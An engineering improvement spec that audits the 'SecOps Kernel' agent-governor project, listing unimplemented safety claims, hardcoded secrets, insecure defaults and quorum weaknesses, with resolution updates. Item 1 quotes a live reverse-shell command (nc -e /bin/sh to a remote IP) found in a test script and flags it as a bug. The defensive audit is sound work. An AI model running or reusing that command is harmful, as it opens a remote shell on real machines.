# SecOps Kernel: Improvement Spec

This spec is grounded in the actual code as of commit `f638e66` (branch `feature/integrate-complete-ci-manifest`), not the marketing copy in README.md / SECURITY.md / docs/*. The project currently reads as a well-documented *concept* for an agent-execution governor; almost none of the safety claims it makes are backed by working code yet. The items below are ordered by what blocks the project from being trustworthy, grouped into P0 (must fix before anyone relies on this for real), P1 (needed for the architecture to actually function), and P2 (hardening/polish).

## P0 — Fix now, security-critical

*(Resolved in the P0 PR — #1-4 below.)*

1. **`test/exploit_simulation.sh` is a live reverse shell, not a simulation.**
   Line 22 runs `exec nc -e /bin/sh 10.0.0.1 4444`. If `nc` with `-e` support is present and that IP is reachable, this opens a real shell to a remote host — it doesn't "simulate" a breach, it performs one. Rewrite this as an actual unit/integration test that asserts the eBPF program kills unauthorized `execve` calls (e.g. spawn a subprocess from a controlled harness and assert on exit code 137), with no outbound network action. Until fixed, this script must not run in CI or on any machine with real network egress.

2. **No gRPC server implementation exists.**
   `pkg/api/v2/secops_kernel.proto` defines `ZKIntentCompiler`, `ForkVerifyEngine`, and `TelemetryStreamer`, and `pkg/agent/remediation_worker.go` is a *client* that dials `127.0.0.1:50051` — but there is no corresponding server anywhere in the repo that implements `UnimplementedZKIntentCompilerServer` etc. Every safety property described in README/architecture.md (Dafny verification, microVM replay, atomic commit) is currently unenforceable because the thing that would enforce it doesn't run. This is the single most important gap: build `cmd/kernel-server/` (or similar) that wires the proto services to real handlers, even if those handlers are initially minimal.

3. **eBPF token map is never populated.**
   `pkg/kernel/ebpf/monitor.c` checks `active_tokens_map` for the current PID and SIGKILLs on a miss — but nothing in the Go code ever inserts a token into that map. `test/exploit_simulation.sh`'s own comment admits this: *"Normally handled by Go controller"* (doesn't exist). As written, this program would kill every `execve` on the host, not just unauthorized ones. Needs: a Go controller using `cilium/ebpf` (or similar) that loads the object, grants tokens on `CompileZKIntent` PASS, and revokes them on TTL expiry/commit.

4. **Secrets are hardcoded and the "license" scheme isn't a license.**
   `license_validator.go` / `license_validator_test.go` embed `"enterprise_secret_salt_2026"` as a literal. Because the validation algorithm and (eventually) the salt live in an open-source repo, this gives no real protection — anyone can mint a passing signature once they have the salt, and the salt can't rotate without a code change. Replace with a real secret-management story (env var / secret store, asymmetric signing instead of a shared salt) or drop the "license" framing entirely if this is just an internal feature flag.

## P1 — Needed for the architecture to function as described

*(Resolved in the P1 PR — #5-8 below. #5 specifically took option (b): `pkg/server.CheckNode`/`CheckGraph` re-implement the invariant in Go at request time, kept in sync with `intent_rules.dfy` by hand and by a comment pointing each direction; `dafny verify` itself still only runs as a static CI check on the `.dfy` file.)*

5. **Dafny verification is disconnected from the Go runtime.**
   `pkg/verify/dafny/intent_rules.dfy` proves `writePrivilege ⟹ subnet ∈ [1000, 9999]` — but nothing in `pkg/agent` or a (currently nonexistent) server calls into this proof, or even re-implements the same check in Go, at request time. CI runs `dafny verify` once per push as a static check on the `.dfy` file, which only proves the spec is internally consistent — it proves nothing about what the running Go service actually does with an `IntentGraph`. Either (a) compile the Dafny model to a target that's actually invoked per-request, or (b) treat Dafny as documentation of intent and enforce the equivalent invariant directly in the Go compiler path, with tests asserting they stay in sync.

6. **Firecracker orchestration doesn't do what its name says.**
   `SpawnIsolatedStateMirror` starts a bare `firecracker --api-sock ...` process and kills it after a timeout. It never configures a kernel image, rootfs, vsock, or snapshot/restore — so there's no actual "state mirror" or diffing happening. `StateDiffMetrics` (files_mutated, memory_drift_bytes, etc.) in the proto has no producer. Implement real microVM boot config + the Firecracker snapshot API, and have `ExecuteForkVerify` actually populate `StateDiffMetrics` from observed state, or shrink the claims in architecture.md to match what's implemented.

7. **mTLS is optional in practice, default is insecure.**
   `pkg/sdk/py/secops_kernel/client.py` uses `grpc.insecure_channel` as the default client; `client_mtls.py` exists alongside it but nothing prevents callers from using the insecure path in production. Given SECURITY.md claims "mTLS Key Encrypted" enforcement, either make the insecure channel dev-only (e.g. gate behind an explicit `--insecure` flag with a warning) or remove it.

8. **Consensus quorum has no byzantine-fault tolerance against a single compromised agent repeating itself.**
   `bft_quorum.go` keys `Proposals` by `ModelArch`, so two proposals from agents with the same architecture overwrite each other — meaning the "2-of-3 heterogeneous" guarantee depends entirely on the caller actually running distinct architectures and submitting once each. There's no agent identity/signature check preventing one compromised agent from submitting multiple proposals under different claimed `ModelArch` values to manufacture a quorum. Add proposal signing + identity verification before counting a vote.

## P2 — Hardening, testing, and docs hygiene

*(Resolved in the P2 PR — #9-13 below.)*

9. **Test coverage is effectively hollow.** ~~The CI coverage gate (`go tool cover -func=coverage.out`, 80% floor) only measures packages that have tests today...~~ **Update:** every package with hand-written logic now has tests, including `cmd/kernel-server` (service registration, token-controller error paths) and `cmd/secopsctl` and `pkg/agent` (previously 0%, their logic was extracted out of `main()` into testable functions). Measured total via `go test -coverprofile`: **59.9%**, still under the CI's 80% floor. What's left uncovered and why, concretely:
    - `pkg/kernel/ebpftoken.Load`'s and `pkg/sandbox/firecracker`'s happy paths (actually loading a compiled BPF object, actually spawning/ptracing a Firecracker process) require `CAP_BPF`/`CAP_SYS_ADMIN` and a real compiled `monitor.o` / `firecracker` binary — none of which exist in the sandbox this was written in. Only the error paths (missing file, invalid object) are tested.
    - A real per-file `FilesMutated` count and `NetworkPacketsDropped` were investigated and explicitly **not implemented**: the straightforward approach (loopback-mount the pre/post rootfs image and diff file trees) needs `CAP_SYS_ADMIN`, unavailable here; a no-root alternative (`github.com/diskfs/go-diskfs`'s pure-Go ext4 reader) failed to parse even a trivial synthetic ext4 image (`mkfs.ext4` on a plain file) in testing — `readdir error: invalid argument` — so it wasn't trustworthy enough to ship against real Firecracker rootfs images. `NetworkPacketsDropped` would additionally need tap-device/network-namespace setup (`CAP_NET_ADMIN`) that was never configured in the orchestrator at all. Both fields remain unset in `StateDiffMetrics`.
    - `main()` entrypoints themselves (flag parsing, `net.Listen`/`Serve` loops) are intentionally left untested per normal Go convention — the logic they wire together is tested via the extracted functions.
    - Generated code (`pkg/api/v2/*.pb.go`) is excluded, as usual.

10. **Docker Compose runs more privileged than it needs to for local dev.** ~~`cap_add: SYS_ADMIN` + `apparmor:unconfined` + `/dev/kvm` passthrough in `docker-compose.yml` is broad for a default "local testbed."~~ **Resolved:** split into `kernel-core-dev` (default, no privileged flags, build + `go test ./...`) and `kernel-core-microvm` (opt-in via `--profile microvm`, carries the privileged bits for actually exercising Firecracker/eBPF).

11. **Docs mix marketing copy with technical reference, which actively misleads.** ~~`docs/hacker_news_launch.md`, `docs/show_hn_pitch.md`, and the tone throughout README.md/SECURITY.md... describe a mature, hardened product.~~ **Resolved:** marketing docs moved to `docs/vision/` with a banner on each pointing back here; the duplicate `docs/hacker_news_launch.md` (identical to `show_hn_pitch.md`) was removed rather than also moved; README.md/SECURITY.md/architecture.md got a short status banner at the top; `mkdocs.yml` nav now separates "Vision" from the technical pages.

12. **Error/verdict taxonomy (`0x00_*` strings) isn't typed.** ~~These are free-form strings compared by value...~~ **Resolved:** `pkg/kerncode` defines each code as a `Code` (implements `error`); call sites wrap it with `%w` so `errors.Is` works and `err.Error()` still contains the original string (existing `strings.Contains` checks keep passing).

13. **No input validation on `IntentGraph` beyond the Dafny subnet rule.** ~~Nothing in the proto or (missing) server validates `action_directive` against an allow-list, bounds `argument_payload_bytes` size, or checks graph structure...~~ **Resolved:** `pkg/server.ValidateGraphStructure` runs before the subnet invariant check and rejects empty/duplicate node IDs, edges referencing unknown nodes, cycles (DFS with a visiting/done coloring), directives outside the `SYS_CALL_*` namespace, and payloads over 4096 bytes.

## P3 — Follow-up found while closing out P0–P2

14. **`configs/secops-kernel.yaml` was documented as live policy but nothing read it.** `docs/sdk.md` used to tell readers to "define your system boundary parameters" there; no Go code ever opened the file. **Resolved:** `pkg/config.Load` parses it (failing closed on a missing file, malformed YAML, or a non-positive value for either field below), and `cmd/kernel-server` wires two fields to real enforcement: `engine.max_execution_window_ms` as a ceiling that aborts any `CompileZKIntentRequest` asking for a longer execution window, and `engine.memory_fence_bytes` as the default microVM memory limit (replacing a hardcoded `512`). Every other field (`taint_tracking.*`, `cryptography.attestation_mode`/`zk_circuit_path`, `fail_safe.*`) is parsed and shape-validated but still not wired to any behavior — see the field comments in `pkg/config/config.go` for specifics. `docs/sdk.md` updated accordingly.

## Suggested sequencing

Fix #1 immediately (it's a standalone security bug, not an architecture gap). Then #2 (server) unblocks everything else, since #3, #5, #6 all assume a server exists to host them. #4, #7 are independent and can land in parallel. #8–#13 follow once the core request path is real. #14 is independent cleanup discovered while re-measuring #9.
